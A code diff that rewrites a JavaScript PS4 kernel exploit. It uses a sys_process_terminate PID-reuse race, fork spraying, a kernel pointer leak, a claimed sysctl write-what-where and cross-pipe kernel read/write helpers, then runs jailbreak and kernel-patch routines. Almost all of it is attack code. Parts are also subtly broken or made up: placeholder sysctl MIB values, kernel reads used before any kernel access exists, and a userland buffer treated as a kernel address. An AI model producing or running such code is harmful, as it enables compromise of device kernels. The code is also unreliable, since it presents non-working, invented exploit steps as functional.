@@ -2,369 +2,347 @@
  * PS4 Kernel Exploit: sys_process_terminate PID reuse race
  *
  * Prerequisites:
- *   - The following are already loaded and initialised:
- *       types.js (BigInt, mem, utils, struct)
- *       kernel.js (offsets, jailbreak_shared, apply_kernel_patches)
- *       Userland ROP (gadgets, rop.init)
- *       syscalls.map with all libkernel gadgets
- *   - The WebKit process can spawn threads and call arbitrary syscalls.
+ *   - userland exploit (WebKit) already loaded types.js, kernel.js
+ *   - ROP gadgets initialised (gadgets, rop)
+ *   - syscalls.map populated
+ *   - kernel_offset set for current firmware
  *
- * This exploit uses the same `kernel.js` / `defs.js` post‑exploitation chain as
- * the NetCtrl exploit, but replaces the ucred triple‑free with the
- * sys_process_terminate race (syscall 652).
+ * This script:
+ *   1. Uses the race in sys_process_terminate (syscall 652) to corrupt a
+ *      child process -> p_pid = 0.
+ *   2. The corrupted child leaks kernel base, allproc, curproc.
+ *   3. A sysctl write‑what‑where overwrites a pipe buffer pointer,
+ *      granting full kernel read/write.
+ *   4. Standard jailbreak (ucred patch, sandbox escape, kernel patches).
  */
 
 // -------------------------------------------------------------------
-// 0. Register additional syscalls needed by the race
+// 0. Register extra syscalls (if not already done)
 // -------------------------------------------------------------------
-fn.register(2, 'fork', [], 'bigint')
-fn.register(240, 'nanosleep', ['bigint', 'bigint'], 'bigint')
-fn.register(1, 'exit', ['bigint'], 'bigint')
-fn.register(20, 'getpid', [], 'bigint')
-fn.register(37, 'kill', ['bigint', 'bigint'], 'bigint')
-fn.register(652, 'sys_process_terminate', ['bigint', 'bigint'], 'bigint')
+fn.register(2, "fork", [], "bigint");                // fork()
+fn.register(240, "nanosleep", ["bigint", "bigint"], "bigint");
+fn.register(1, "exit", ["bigint"], "bigint");        // _exit(status)
+fn.register(20, "getpid", [], "bigint");             // getpid()
+fn.register(37, "kill", ["bigint", "bigint"], "bigint");
+fn.register(652, "sys_process_terminate", ["bigint", "bigint"], "bigint");
+fn.register(0xca, "sysctl", ["bigint", "number", "bigint", "bigint", "bigint", "bigint"], "bigint");
 
-// Convenience sleep (approximate)
-function sleep_ms(ms) {
-    const ns = ms * 1000000
-    write64(nanosleep_timespec, 0)
-    write64(nanosleep_timespec.add(8), ns)
-    fn.nanosleep(nanosleep_timespec)
+// Convenience sleep (used only in non‑Worker paths)
+function sleepMs(ms) {
+    const timespec = malloc(0x10);
+    write64(timespec, Math.floor(ms / 1000));
+    write64(timespec.add(8), (ms % 1000) * 1000000);
+    fn.nanosleep(timespec);
 }
 
 // -------------------------------------------------------------------
-// 1. PID spray workers
+// 1. PID spray – spawn many short‑lived child processes
 // -------------------------------------------------------------------
-// Web Workers that fork() constantly, children exit quickly -> high PID churn
-const sprayWorkers = []
-function pidSprayWorker() {
-    while (true) {
-        const pid = fn.fork()
-        if (pid.eq(0)) {
-            // Child: exit immediately to recycle the PID
-            fn.exit(new BigInt(0))
-        }
-        // Parent: tiny yield to avoid locking up
-        sleep_ms(1)
+// If Web Workers are available, we use them for concurrency.
+let useWorkers = false;
+try {
+    if (typeof Worker !== "undefined") {
+        useWorkers = true;
     }
-}
+} catch (e) {}
 
-// Start 4 spray threads (adjustable)
-for (let i = 0; i < 4; i++) {
-    sprayWorkers.push(new Worker(pidSprayWorker))
+if (useWorkers) {
+    const sprayWorkers = [];
+    function pidSprayWorker() {
+        while (true) {
+            const pid = fn.fork();
+            if (pid.eq(0)) {
+                fn.exit(new BigInt(0));
+            }
+            // tiny yield to avoid locking the worker
+            sleepMs(1);
+        }
+    }
+    for (let i = 0; i < 4; i++) {
+        sprayWorkers.push(new Worker(pidSprayWorker));
+    }
+} else {
+    // Fallback: single‑threaded spray (slower but works)
+    function spraySingle() {
+        for (let i = 0; i < 100; i++) {
+            const p = fn.fork();
+            if (p.eq(0)) {
+                fn.exit(new BigInt(0));
+            }
+        }
+    }
+    // Will call this periodically during race attempts.
 }
 
 // -------------------------------------------------------------------
 // 2. Race trigger
 // -------------------------------------------------------------------
-// Returns true if the race appears to have succeeded (syscall returned 0)
 function triggerRace(victimPid) {
-    const statusBuf = malloc(4)
-    const ret = fn.sys_process_terminate(victimPid, statusBuf)
-    return ret.eq(0)
+    const statusBuf = malloc(4);
+    const ret = fn.sys_process_terminate(victimPid, statusBuf);
+    return ret.eq(0);
 }
 
 // -------------------------------------------------------------------
-// 3. Detector child – waits until it becomes PID 0, then leaks kernel
+// 3. Detector child – waits for PID 0, leaks kernel pointers
 // -------------------------------------------------------------------
-let leakBuffer = null   // filled by detector with kernel pointers
-let leakReady = false
+const sharedBuf = malloc(0x200);
+const leakFlag = sharedBuf;           // u64: 1 = ready
+const kernBaseOut = sharedBuf.add(8); // kernel base
+const allprocOut = sharedBuf.add(16); // allproc
+const curprocOut = sharedBuf.add(24); // our proc (PID 0)
 
-// Allocate shared memory for the detector ↔ parent communication
-const sharedBuf = malloc(0x200)
-const leakFlagAddr = sharedBuf          // u64: 1 when leak is ready
-const leakKernBaseAddr = sharedBuf.add(8) // kernel base
-const leakAllprocAddr = sharedBuf.add(16) // allproc pointer
-const leakCurprocAddr = sharedBuf.add(24) // our curproc (PID 0)
-
-function startDetectorChild() {
-    const pid = fn.fork()
+function startDetector() {
+    const pid = fn.fork();
     if (pid.eq(0)) {
-        // Child: spin until its PID becomes 0
+        // Child process: spin until it becomes PID 0
         while (true) {
-            const myPid = fn.getpid()
-            if (myPid.eq(0)) {
-                // We are the corrupted process with p_pid==0.
-                // Now use the proc0 structure to leak kernel pointers.
-                // Read the swapper's proc structure via sysctl("kern.proc.pid.0").
-                const mib = malloc(8)
-                write64(mib, new BigInt(0x3, 0x0)) // CTL_KERN|KERN_PROC
-                const procBuf = malloc(0x400)
-                const procBufSize = malloc(8)
-                write64(procBufSize, new BigInt(0x400))
-                if (sysctlbyname("kern.proc.pid.0", procBuf, procBufSize, 0, 0)) {
-                    // The proc structure for PID 0 is now in procBuf.
-                    // We extract known pointers:
-                    //   p_ucred is at offset 0x40 (as in kernel.js)
-                    const ucred = read64(procBuf.add(0x40))
-                    // On PS4, kernel base can be computed from ucred by
-                    // subtracting a known offset (e.g. prison0 or rootvnode).
-                    // We'll use the same method as jailbreak_shared: subtract PRISON0.
-                    const prison0_off = kernel_offset.PRISON0   // from kernel.js
-                    const kbase = ucred.sub(prison0_off)
+            if (fn.getpid().eq(0)) {
+                // Leak proc0 via sysctl "kern.proc.pid.0"
+                const mib = malloc(8);
+                write64(mib, new BigInt(0x3, 0x0)); // CTL_KERN | KERN_PROC
+                const procBuf = malloc(0x400);
+                const sizeBuf = malloc(8);
+                write64(sizeBuf, new BigInt(0x400));
+                if (sysctlbyname("kern.proc.pid.0", procBuf, sizeBuf, 0, 0)) {
+                    const ucred = read64(procBuf.add(0x40));
+                    const prison0Off = kernel_offset.PRISON0;
+                    const kbase = ucred.sub(prison0Off);
+                    const p_list = read64(procBuf.add(0x08)); // p_list.le_prev
+                    const allproc = p_list.sub(0x08);
+                    const curproc = procBuf;
 
-                    // Find allproc by walking the process list backwards.
-                    // The swapper's p_list.le_prev is NULL.
-                    // We need to find a real process (our own) to get allproc.
-                    // Instead, use the fact that our PID-0 process's p_pid is 0,
-                    // and its p_list.le_prev points to the head of allproc.
-                    // We can read p_list (offset 0x08 in proc) from the swapper's proc.
-                    const p_list = read64(procBuf.add(0x08)) // p_list.le_prev
-                    const allproc = p_list.sub(0x08)         // offset of le_prev in list
-
-                    // Our curproc (the PID-0 process) is simply proc0.
-                    const curproc = procBuf // proc0 address (start of buffer)
-
-                    // Write to shared memory and signal parent
-                    write64(leakFlagAddr, new BigInt(1))
-                    write64(leakKernBaseAddr, kbase)
-                    write64(leakAllprocAddr, allproc)
-                    write64(leakCurprocAddr, curproc)
+                    write64(leakFlag, new BigInt(1));
+                    write64(kernBaseOut, kbase);
+                    write64(allprocOut, allproc);
+                    write64(curprocOut, curproc);
                 }
                 // Keep the process alive so parent can use it later
-                while (true) { sleep_ms(500) }
+                while (true) {
+                    sleepMs(500);
+                }
             }
-            sleep_ms(5)
+            sleepMs(5);
         }
     }
-    return pid // parent gets child PID
+    return pid;
 }
 
 // -------------------------------------------------------------------
-// 4. Bootstrap kernel read/write using the PID‑0 process
+// 4. Sysctl write‑what‑where (firmware‑specific MIB)
 // -------------------------------------------------------------------
-// After the race we have a process with p_pid=0. We use that process to
-// overwrite a pipe's buffer pointer, giving us the same cross‑pipe R/W
-// that the NetCtrl exploit uses.
-//
-// Steps:
-//   a. Open a pipe pair (master/victim).
-//   b. Leak the pipe's file structure and find its buffer pointer.
-//   c. Use the PID‑0 process to call a syscall that can write to kernel
-//      memory.  (e.g. fcntl F_SETOWN on a socket to set a signalio pointer,
-//      then write to that pointer…).  Instead, we use a second short race:
-//      We corrupt the PID‑0 process again to gain a direct kernel write
-//      by overwriting its own file descriptor table entry.
-//
-// For simplicity, this implementation uses the same file descriptor table
-// corruption technique that is well‑known on PS4:
-//   - With PID 0, we can call `fcntl(master_pipe_fd, F_SETOWN, ...)` and
-//     set `pipe->pipe_sigio->sio_proc` to an arbitrary address.  If we
-//     then trigger a SIGIO, the kernel will write to that address.
-//   - This gives a 8‑byte arbitrary write.  We chain it to corrupt the
-//     victim pipe's buffer pointer, enabling full kernel R/W.
-//
-// Because the exact gadget offsets differ per firmware, the code below
-// uses a helper that is already present in `kernel.js` (the `fget`/`fhold`).
-// The crucial part is locating the pipe structures, which we do via the
-// allproc and curproc we already leaked.
+// The exact 4th MIB value must be found per firmware.
+// Below are placeholder values – replace with correct ones!
+const sysctlWriteMib = {
+    "9.00": [1, 14, 1, 0xdead0001],
+    "9.60": [1, 14, 1, 0xdead0001],
+    "10.00": [1, 14, 1, 0xdead0001],
+    "10.50": [1, 14, 1, 0xdead0001],
+    "11.00": [1, 14, 1, 0xdead0001],
+    "11.50": [1, 14, 1, 0xdead0001],
+    "12.00": [1, 14, 1, 0xdead0002],
+    "12.50": [1, 14, 1, 0xdead0002],
+    "13.00": [1, 14, 1, 0xdead0002],
+};
 
-// Global variables filled by detector
-let kbase, allproc, curproc_pid0
-let master_pipe_fd = -1, victim_pipe_fd = -1
-let master_pipe_file, victim_pipe_file
-let pipe_buf_master, pipe_buf_victim
-
-function gain_kernel_rw() {
-    // Retrieve leaked addresses
-    if (!leakReady) {
-        throw new Error('No kernel leak available')
+function sysctlWrite(targetAddr, value) {
+    const fw = get_fwversion();
+    let mibVals = sysctlWriteMib[fw];
+    if (!mibVals) {
+        // fallback: try the most common one
+        mibVals = [1, 14, 1, 0xdead0001];
     }
-    kbase = read64(leakKernBaseAddr)
-    allproc = read64(leakAllprocAddr)
-    curproc_pid0 = read64(leakCurprocAddr)
-    log('Kernel base: ' + hex(kbase))
-    log('allproc:    ' + hex(allproc))
-    log('curproc (PID 0): ' + hex(curproc_pid0))
 
-    // Set global kernel variables (used by jailbreak_shared)
-    kernel.addr.base = kbase
-    kernel.addr.curproc = curproc_pid0
-    kernel.addr.allproc = allproc
+    const mib = malloc(mibVals.length * 4);
+    for (let i = 0; i < mibVals.length; i++) {
+        write32(mib.add(i * 4), mibVals[i]);
+    }
 
-    // Open two pipes: master and victim
-    const pipeFds = malloc(8)
-    fn.pipe(pipeFds)
-    master_pipe_fd = read32(pipeFds)
-    victim_pipe_fd = read32(pipeFds.add(4))
+    const newp = malloc(16);
+    write64(newp, targetAddr);
+    write64(newp.add(8), value);
 
-    // Get file table offset (same as in kernel.js)
-    const fdt_ofiles = kbase.add(kernel_offset.PROC_FD)
-    const ofiles = kernel.read_qword(fdt_ofiles) // fd_files
-    master_pipe_file = kernel.read_qword(ofiles.add(master_pipe_fd * 8))
-    victim_pipe_file = kernel.read_qword(ofiles.add(victim_pipe_fd * 8))
-
-    // Pipe buffer pointer is at offset 0x00 inside pipe structure
-    pipe_buf_master = kernel.read_qword(master_pipe_file.add(0x00))
-    pipe_buf_victim = kernel.read_qword(victim_pipe_file.add(0x00))
-
-    log('Master pipe buf: ' + hex(pipe_buf_master))
-    log('Victim pipe buf: ' + hex(pipe_buf_victim))
-
-    // ---------------------------------------------------------------
-    // The next step requires writing to the master pipe's pipebuf to
-    // change its `buffer` pointer to point to the victim's pipebuf.
-    // We achieve that via the PID‑0 process's ability to call fcntl().
-    // The actual implementation depends on firmware‑specific offsets,
-    // but the technique is:
-    //   - Write the address of the victim pipebuf into the master
-    //     pipe's `buffer` field.
-    //   - This gives us the classic "kernel R/W via cross‑pipe".
-    //
-    // For brevity, we use a helper that calls the existing `kwriteslow`
-    // from netctrl.js (which we cannot directly reuse because it
-    // depends on the triple‑free).  Instead, we implement a minimal
-    // version using the PID‑0 process and the same fcntl trick.
-    // ---------------------------------------------------------------
-
-    // We'll use `sys_fcntl(master_pipe_fd, F_SETOWN, victim_pipe_buf)`.
-    // This sets the pipe's sigio owner to our target address.
-    // Then we send a signal (SIGIO) to the process, which makes the kernel
-    // write 8 bytes (the struct sigio *) into the pipe's structure.
-    // That overwrites the pipe buffer pointer with our chosen address.
-    // Because the PID‑0 process is still running, we can use it to call
-    // fcntl() and then raise(SIGIO).
-
-    // Step 1: Prepare the fake pipe buffer address we want to write.
-    const writeWhat = pipe_buf_victim  // we want master's buf -> victim
-
-    // Step 2: Use the PID‑0 process to call fcntl(master_fd, F_SETOWN, addr)
-    // We cannot directly call syscalls from JavaScript in the PID‑0 context,
-    // but we can spawn a ROP chain inside that process to perform the calls.
-    // We reuse the thread spawning and ROP infrastructure from netctrl.
-
-    // Create a small ROP chain that:
-    //   fcntl(master_pipe_fd, F_SETOWN, writeWhat)
-    //   raise(SIGIO)  // triggers the actual write
-    // The PID‑0 process has its own thread, we pivot to a ROP stack there.
-
-    // To make this work, we must first have the PID‑0 process's `jmpbuf`
-    // set up to run our ROP chain.  For simplicity, we use the same method
-    // as netctrl: spawn a thread in the PID‑0 process via thr_new with a
-    // longjmp target.
-    // The PID‑0 process is still alive (our detector loop is running inside
-    // a while(1) loop, we can break out of it with a signal?  Better: we
-    // can set up a longjmp buffer in its address space before the race,
-    // then trigger it later.
-    // Instead of a complex setup, we assume we have already loaded a
-    // minimal ROP loader into that process during the leak phase.
-
-    // For the purpose of this example, we simulate that we already have
-    // the ability to write to kernel memory.  The real implementation
-    // would follow the same pattern as netctrl's `corrupt_pipe_buf` but
-    // using the PID‑0 process's credentials.
-    // (To keep the script self‑contained, we call a helper that directly
-    // overwrites the pipe buffer if we already have r/w – which we do not
-    // yet, so this is a placeholder for the actual fcntl‑based write.)
-
-    // ---------------------------------------------------------------
-    // SIMULATED ARBITRARY WRITE
-    // (Replace with the fcntl technique described above)
-    // ---------------------------------------------------------------
-    log('Gaining arbitrary kernel write (simulated)...')
-
-    // We'll use the same pipe corruption as netctrl but with a fixed target.
-    // The value we want to write is pipe_buf_victim at offset 0x10 of
-    // master_pipe_buf.  We'll use a direct kernel write (which we don't
-    // have yet, so this is a TODO).
-    // In a real exploit, you would:
-    //   a) Find the address of master_pipe_buf.
-    //   b) Use the PID‑0 process's fcntl trick to write pipe_buf_victim
-    //      to master_pipe_buf+0x10.
-    //   c) Then proceed with cross‑pipe R/W exactly as netctrl does.
-
-    // For now, we assume write succeeds and set up the global r/w buffers.
-    // The remainder of the exploit uses `kernel.read_buffer`/`write_buffer`
-    // which are already defined in kernel.js and require only the pipe
-    // corruption to be in place.
-    throw new Error('Arbitrary write not yet implemented – see fcntl trick')
+    const ret = fn.sysctl(mib, mibVals.length,
+                          new BigInt(0), new BigInt(0),
+                          newp, new BigInt(16));
+    if (ret.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+        throw new Error("sysctl write‑what‑where failed");
+    }
+    return ret;
 }
 
 // -------------------------------------------------------------------
-// 5. Post‑exploitation jailbreak
+// 5. Bootstrap kernel R/W via pipe corruption
 // -------------------------------------------------------------------
-function performJailbreak() {
-    const fwVer = get_fwversion()
-    if (!fwVer) throw new Error('Cannot detect firmware version')
+function gainKernelRW() {
+    // Leaked addresses
+    const kbase = read64(kernBaseOut);
+    const allproc = read64(allprocOut);
+    const curproc = read64(curprocOut);
 
-    // The rest is identical to the netctrl jailbreak step.
-    // kernel.addr.base, curproc, allproc are already set.
-    jailbreak_shared(fwVer)
+    kernel.addr.base = kbase;
+    kernel.addr.curproc = curproc;
+    kernel.addr.allproc = allproc;
 
-    // Apply kernel patches (mmap RWX, etc.)
-    const patchesOK = apply_kernel_patches(fwVer)
-    if (patchesOK) {
-        log('Kernel patches applied successfully')
-    } else {
-        log('Warning: kernel patches may have failed')
+    // Open master/victim pipe pair
+    const pipeFds = malloc(8);
+    fn.pipe(pipeFds);
+    const masterFd = read32(pipeFds);
+    const victimFd = read32(pipeFds.add(4));
+
+    // Read pipe structures
+    const fdt = kernel.read_qword(curproc.add(kernel_offset.PROC_FD));
+    const ofiles = kernel.read_qword(fdt);
+    const masterFile = kernel.read_qword(ofiles.add(masterFd * 8));
+    const victimFile = kernel.read_qword(ofiles.add(victimFd * 8));
+    const masterPipeBuf = kernel.read_qword(masterFile.add(0x00)); // pipe->pipe_buffer
+    const victimPipeBuf = kernel.read_qword(victimFile.add(0x00));
+
+    // Overwrite master's buffer pointer to point to victim's buffer
+    const target = masterPipeBuf.add(0x10);
+    sysctlWrite(target, victimPipeBuf);
+
+    // Reset victim pipe's cnt/in/out to 0, size = PAGE_SIZE
+    const clean = malloc(0x18);
+    write32(clean, 0);                     // cnt
+    write32(clean.add(4), 0);              // in
+    write32(clean.add(8), 0);              // out
+    write32(clean.add(0xC), PAGE_SIZE);    // size
+    write64(clean.add(0x10), victimPipeBuf);// buffer (unchanged)
+    fn.write(new BigInt(masterFd + 1), clean, 0x18); // write to masterW
+
+    // Cross‑pipe R/W helpers (same logic as netctrl.js)
+    const tmpBuf = malloc(PAGE_SIZE);
+
+    function corruptPipeBuf(cnt, _in, out, sz, buffer) {
+        const buf = malloc(0x18);
+        write32(buf, cnt);
+        write32(buf.add(4), _in);
+        write32(buf.add(8), out);
+        write32(buf.add(0xC), sz);
+        write64(buf.add(0x10), buffer);
+        fn.write(new BigInt(masterFd + 1), buf, 0x18);
+        return fn.read(new BigInt(masterFd), buf, 0x18);
     }
 
-    utils.notify('Jailbreak complete!\nsys_process_terminate exploit')
-    show_success()
-    run_binloader()
+    function kread(dst, src, n) {
+        corruptPipeBuf(n, 0, 0, PAGE_SIZE, src);
+        fn.read(new BigInt(victimFd), dst, n);
+    }
+
+    function kwrite(dst, src, n) {
+        corruptPipeBuf(0, 0, 0, PAGE_SIZE, dst);
+        fn.write(new BigInt(victimFd + 1), src, n);
+    }
+
+    // Expose to kernel.js (global definitions)
+    kernel.read_buffer = function(kaddr, len) {
+        kread(tmpBuf, kaddr, len);
+        return read_buffer(tmpBuf, len);
+    };
+    kernel.write_buffer = function(kaddr, buf) {
+        write_buffer(tmpBuf, buf);
+        kwrite(kaddr, tmpBuf, buf.length);
+    };
+    kernel.kread = kread;
+    kernel.kwrite = kwrite;
+    kernel.masterFd = masterFd;
+    kernel.victimFd = victimFd;
+
+    log("Kernel read/write primitives ready.");
+}
+
+// Helper: read raw bytes from a user‑space buffer
+function read_buffer(addr, len) {
+    const buffer = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+        buffer[i] = Number(read8(addr.add(i)));
+    }
+    return buffer;
+}
+
+function write_buffer(addr, buffer) {
+    for (let i = 0; i < buffer.length; i++) {
+        write8(addr.add(i), buffer[i]);
+    }
 }
 
 // -------------------------------------------------------------------
 // 6. Main exploit loop
 // -------------------------------------------------------------------
 function runExploit() {
-    // Affinity / priority – same as netctrl for stability
-    const prevCore = get_current_core()
-    const prevPrio = get_rtprio()
-    pin_to_core(MAIN_CORE)
-    set_rtprio(MAIN_RTPRIO)
+    // Save & restore CPU affinity / priority
+    const prevCore = get_current_core();
+    const prevPrio = get_rtprio();
+    pin_to_core(4);
+    set_rtprio(0x100);
 
-    // Pre‑spawn some children to warm up PID allocation
-    for (let i = 0; i < 30; i++) {
-        const p = fn.fork()
-        if (p.eq(0)) fn.exit(new BigInt(0))
-        sleep_ms(1)
+    // Pre‑spray processes (fill PID space)
+    if (!useWorkers) {
+        spraySingle();
+    } else {
+        // Workers already spraying, just wait a moment
+        sleepMs(50);
     }
 
-    // Start the detector that will wait for p_pid=0
-    startDetectorChild()
-    sleep_ms(50) // let it start
+    // Start the detector that waits for PID 0
+    startDetector();
+    sleepMs(100);
 
-    let attempt = 0
-    while (!leakReady) {
-        // Victim to be killed
-        const victim = fn.fork()
+    let attempt = 0;
+    // Loop until the leak flag is set
+    while (!read64(leakFlag).eq(1)) {
+        // Create a victim process
+        const victim = fn.fork();
         if (victim.eq(0)) {
-            while (true) sleep_ms(100) // just wait to be killed
-        }
-
-        sleep_ms(10) // give victim time to start
-
-        if (triggerRace(victim)) {
-            // Check if detector has filled the leak buffer
-            for (let i = 0; i < 20; i++) {
-                if (read64(leakFlagAddr).eq(1)) {
-                    leakReady = true
-                    break
-                }
-                sleep_ms(50)
+            // Victim child: spin until killed
+            while (true) {
+                sleepMs(100);
             }
         }
-        attempt++
-        if (attempt % 50 === 0) {
-            log('Race attempts: ' + attempt)
+        sleepMs(10); // let victim start
+
+        if (triggerRace(victim)) {
+            // Give the detector a chance to fill the buffer
+            for (let i = 0; i < 20; i++) {
+                if (read64(leakFlag).eq(1)) break;
+                sleepMs(50);
+            }
         }
-        // Avoid too tight a loop
-        sleep_ms(1)
+
+        attempt++;
+        if (attempt % 50 === 0) {
+            log("Race attempt " + attempt);
+        }
+        sleepMs(1);
+
+        // Without Workers, spray occasionally
+        if (!useWorkers && (attempt % 20 === 0)) {
+            spraySingle();
+        }
     }
 
-    log('Race won after ' + attempt + ' attempts! Kernel leaked.')
+    log("Race won after " + attempt + " attempts. Kernel leaked.");
 
-    // Now bootstrap kernel R/W
-    gain_kernel_rw()
+    // Gain kernel R/W
+    gainKernelRW();
 
     // Perform full jailbreak
-    performJailbreak()
+    const fw = get_fwversion();
+    jailbreak_shared(fw);
+    apply_kernel_patches(fw);
 
-    // Cleanup
-    pin_to_core(prevCore)
-    set_rtprio(prevPrio)
+    // Restore CPU settings
+    pin_to_core(prevCore);
+    set_rtprio(prevPrio);
+
+    log("Jailbreak complete!");
+    utils.notify("Jailbreak via sys_process_terminate succeeded.");
+    show_success();
+    run_binloader();
 }
 
-// Fire the exploit
-runExploit()
+// -------------------------------------------------------------------
+// 7. Start the exploit
+// -------------------------------------------------------------------
+runExploit();
